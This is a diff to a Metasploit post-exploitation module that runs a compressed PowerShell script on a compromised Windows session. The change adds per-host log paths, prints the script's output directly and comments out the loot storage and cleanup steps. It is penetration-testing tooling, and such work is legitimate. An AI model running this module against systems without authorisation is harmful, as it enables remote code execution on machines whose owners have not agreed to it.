@@ -69,11 +69,23 @@ class Metasploit3 < Msf::Post
 		# check/set vars
 		subs = process_subs(datastore['SUBSTITUTIONS'])
 		script_in = read_script(datastore['SCRIPT'])
-
-		script_name = ::File.basename(datastore['SCRIPT'])
+		print_status(script_in)
 
 		# Make substitutions in script if needed
 		script_in = make_subs(script_in, subs) unless subs.empty?
+
+		# Get target's computer name
+		computer_name = session.sys.config.sysinfo['Computer']
+
+		# Create unique log directory
+		log_dir = ::File.join(Msf::Config.log_directory,'scripts', computer_name)
+		::FileUtils.mkdir_p(log_dir)
+
+		# Define log filename
+		script_ext  = ::File.extname(datastore['SCRIPT'])
+		script_base = ::File.basename(datastore['SCRIPT'], script_ext)
+		time_stamp  = ::Time.now.strftime('%Y%m%d:%H%M%S')
+		log_file    = ::File.join(log_dir,"#{script_base}-#{time_stamp}.txt")
 
 		# Compress
 		print_status('Compressing script contents.')
@@ -92,24 +104,22 @@ class Metasploit3 < Msf::Post
 			print_status('Launching stager:')
 			script = stage_to_env(compressed_script, env_suffix)
 			print_good("Payload successfully staged.")
-			require_cleanup = true
 		else
 			print_good("Compressed size: #{compressed_script.size}")
 			script = compressed_script
-			require_cleanup = false
 		end
 
 		# Execute the powershell script
-		print_status('Executing the script.')
+		#print_status('Executing the script.')
 		cmd_out = execute_script(script, datastore['TIMEOUT'])
-		vprint_good("Script Output:")
-		vprint_line(cmd_out)
-		script_log = store_loot("host.command.powershell", "text/plain", session, cmd_out ,
-			"#{script_name}.txt", "script Output #{script_name}")
-		print_status("Command output saved to: #{script_log}")
-		if require_cleanup
-			vprint_status(cleanup(env_suffix))
-		end
+		print_line(cmd_out)
+		# Write output to log
+		#print_status("Logging output to #{log_file}.")
+		#write_to_log(cmd_out, log_file, eof)
+
+		# Clean up
+		#print_status('Cleaning up residual objects and processes.')
+		#clean_up(datastore['SCRIPT'], eof, running_pids, open_channels, env_suffix)
 
 		# That's it
 		print_good('Finished!')
